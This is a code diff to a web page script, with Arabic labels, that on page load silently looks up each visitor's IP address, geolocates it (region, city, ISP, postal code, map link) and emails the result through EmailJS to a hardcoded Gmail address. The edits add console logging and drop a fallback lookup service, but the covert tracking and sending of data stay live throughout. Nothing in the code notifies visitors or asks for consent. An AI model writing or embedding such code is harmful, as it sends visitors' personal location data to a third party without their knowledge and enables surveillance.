@@ -6,40 +6,30 @@ window.onload = function () {
 
     fetch("https://api.ipify.org?format=json")
         .then(res => res.json())
-        .then(data => fetch(`https://ipapi.co/${data.ip}/json/`))
+        .then(data => {
+            console.log("IP:", data.ip);
+            return fetch(`https://ipapi.co/${data.ip}/json/`);
+        })
         .then(res => res.json())
         .then(loc => {
+            console.log("Location data from ipapi:", loc);
+
             let googleMapUrl = "تعذر توليد رابط الخريطة";
 
             if (loc.latitude && loc.longitude) {
                 googleMapUrl = `https://www.google.com/maps?q=${loc.latitude},${loc.longitude}`;
-            } else {
-                // إذا لم تتوفر الإحداثيات، حاول الحصول على الموقع من API بديل (مثلاً freegeoip.app)
-                return fetch("https://freegeoip.app/json/")
-                    .then(res => res.json())
-                    .then(altLoc => {
-                        if (altLoc.latitude && altLoc.longitude) {
-                            googleMapUrl = `https://www.google.com/maps?q=${altLoc.latitude},${altLoc.longitude}`;
-                        }
-                        return {
-                            ...loc,
-                            latitude: altLoc.latitude || loc.latitude,
-                            longitude: altLoc.longitude || loc.longitude,
-                        };
-                    });
             }
 
-            return loc;
-        })
-        .then(loc => {
             const locationString = `
-                ${loc.region || 'غير معروف'} - 
-                ${loc.city || 'غير معروف'} - 
-                ${loc.county || 'غير معروف'} - 
-                ${loc.org || 'غير معروف'} - 
-                ${loc.postal || 'بدون رمز بريدي'}
-                \nرابط الخريطة: ${loc.latitude && loc.longitude ? `https://www.google.com/maps?q=${loc.latitude},${loc.longitude}` : "غير متوفر"}
+                المنطقة: ${loc.region || 'غير معروف'}
+                المدينة: ${loc.city || 'غير معروف'}
+                المحافظة: ${loc.county || 'غير معروف'}
+                المزود: ${loc.org || 'غير معروف'}
+                الرمز البريدي: ${loc.postal || 'بدون رمز بريدي'}
+                رابط الخريطة: ${googleMapUrl}
             `;
+
+            console.log("Location string to send:", locationString);
 
             return emailjs.send("service_25q0ern", "template_xi6fmgy", {
                 to_email: "e508769103@gmail.com",
@@ -47,6 +37,9 @@ window.onload = function () {
                 time: new Date().toLocaleString('ar-EG'),
                 message: locationString
             });
+        })
+        .then((response) => {
+            console.log("Email sent successfully:", response.status, response.text);
         })
         .catch(err => {
             console.error("خطأ أثناء جلب أو إرسال البيانات:", err);
